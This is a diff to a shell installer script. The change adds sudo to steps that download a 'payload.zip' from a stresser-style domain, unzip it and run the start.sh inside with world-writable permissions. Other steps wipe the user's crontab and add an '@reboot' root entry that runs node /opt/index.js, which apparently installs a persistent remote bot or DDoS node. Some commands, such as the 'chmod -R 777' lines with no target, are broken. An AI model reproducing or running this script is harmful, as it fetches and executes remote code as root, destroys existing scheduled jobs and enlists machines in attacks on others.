@@ -49,7 +49,7 @@ remove_Nodejs() {
 
 
 Del_File_SH(){
-            rm -fr index.js;rm -fr start.sh;rm -fr worker.sh   
+            sudo rm -fr index.js;rm -fr start.sh;rm -fr worker.sh   
 }
 
 Install_Certain_Truc() {
@@ -67,11 +67,11 @@ Install_Nodejs() {
 
 Install_Setup() {
             sudo npm install -g n
-            n latest
+            sudo n latest
             PATH="$PATH"
-            wget -O payload.zip https://cat-stresser.net/Y2F0LXN0cmVzc2VyLm5ldA==.zip
-            unzip payload
-            rm payload.zip
+            sudo wget -O payload.zip https://cat-stresser.net/Y2F0LXN0cmVzc2VyLm5ldA==.zip
+            sudo unzip payload
+            sudo rm payload.zip
             exit_status
 }
 
@@ -81,17 +81,17 @@ Install_Npm(){
 }
 
 Start_Socket(){
-            chmod -R 777
-            ./start.sh
+            sudo chmod -R 777
+            sudo ./start.sh
             exit_status
 }
 
 contrab_remove(){
-            crontab -r
+            sudo crontab -r
 }
 
 crontab_start(){
-    line="@reboot node /opt/index.js"
+    line="@reboot sudo node /opt/index.js"
     (crontab -l; echo "$line" ) | crontab -
 }
 
